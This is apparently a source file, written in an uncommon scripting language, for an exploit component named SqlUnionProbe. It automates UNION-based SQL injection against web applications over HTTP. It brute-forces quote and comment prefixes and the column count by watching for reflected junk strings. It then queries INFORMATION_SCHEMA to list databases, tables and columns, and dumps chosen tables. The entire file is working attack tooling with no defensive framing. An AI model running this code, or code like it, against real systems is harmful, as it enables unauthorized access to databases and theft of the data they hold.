#'SqlUnionOutputInfo';

class init ExploitComponent SqlUnionProbe {
    emitter: SqlEmitter(),
    output: null,
    begins = [ "'", '"', '-1 ', '0 ', '' ],
    ends = [ "#", '--', '' ],
    
    __init__: @(httpTemplate, maxColumns = 0x20) { },
    
    findOutput: @{
        self.emitter = SqlEmitter();
        columns = 0;
        self.log('[?] Searching for union count and output');
        
        while (true) {
            columns++;
            
            for (begin in self.begins) {
                for (end in self.ends) {
                    cols = range(0, columns)
                        @select(@(x) self.emitter.junkString());
                        
                    quote = cols[0][0];
                    
                    colVals = cols 
                        @select(@(x) x.lstrip(quote).rstrip(quote));
                        
                    resp = 
                        self.createInjection(begin, end, cols)
                        |> self.sendRequest;
                    
                    matches = colVals @where(resp.__contains__);
                    
                    if (matches |> len @!= 0) {
                        offset = colVals.index(matches[0]);
                        
                        msg = '\r\n[+] Output found: Columns={}, Offset={}\r\n'
                            .format(columns, offset);
                            
                        self.log(msg);
                        
                        ret SqlUnionOutputInfo(begin, end, columns, offset);
                    }
                }
            }
            
            if (columns >= self.maxColumns) ret null;
        }
    },
    
    inject: @(columns, table, where = null) {
        hasOutput = @() self.output != null;
        
        if (!hasOutput()) self.output = self.findOutput();
        
        if (!hasOutput()) {
            self.log('[X] Could not find output for injection\r\n');
            
            ret null;
        }
        
        injector = SqlUnionInjector(
            { HOST: 'localhost', PORT: 80 },
            self.output.columnCount,
            self.output.columnNumber,
            columns,
            table,            
            delimiter = self.output.begin,
            where = where,
            terminator = self.output.end);
        
        injector.payload = injector.dump;            
        resp = injector.str() |> self.sendRequest;
        
        ret injector.finalize(resp);
    },
    
    parseSchema: @(schemas) {
        if (schemas == null) ret null;
        
        d = schemas @select(@(x) x[0]) |> distinct;
        dbs = dict();
        
        for (x in d)
            dbs[x] = schemas @where(@(y) x == y[0]) @select(@(y) y[1]);
        
        ret dbs;
    },
    
    listSchemas: @()
        self.inject(
            [ 'TABLE_SCHEMA', 'TABLE_NAME' ],
            'INFORMATION_SCHEMA.Tables')        
        |> self.parseSchema,
    
    listColumns: @(schema, table) {
        self.log('[?] Querying information schema for column names');
        
        whereTmpl = 
            " WHERE INFORMATION_SCHEMA.COLUMNS.TABLE_SCHEMA = '{0}' AND" + 
            " INFORMATION_SCHEMA.COLUMNS.TABLE_NAME='{1}'";
        
        cols = self.inject(
            [ 'COLUMN_NAME' ],
            'INFORMATION_SCHEMA.COLUMNS',
            where = whereTmpl.format(schema, table));
            
        if (cols == null) {
           self.log('[X] Could not query information schema\r\n');
           
           ret null;
        }
            
        cols = cols @select(@(x) x[0]);
        tup = cols @select(@(x) '[' + x + ']') @join(', ');            
        self.log('\r\n[+] Columns found: %s\r\n' % tup);
        
        ret cols;
    },
    
    dumpTable: @(table, schema = null, columns = null)
        self.inject(
            schema != null ? 
                self.listColumns(schema, table) : 
                columns,
            table),
    
    sendRequest: @(injection) {
        values = { sqli: injection };
        ret Http.request(
            self.httpTemplate.getUrl(values),
            self.httpTemplate.getPost(values));
    },
    
    createInjection: @(begin, end, cols) Injection(
        begin,
        end,
        @() self.emitter.unionAll(cols)),
};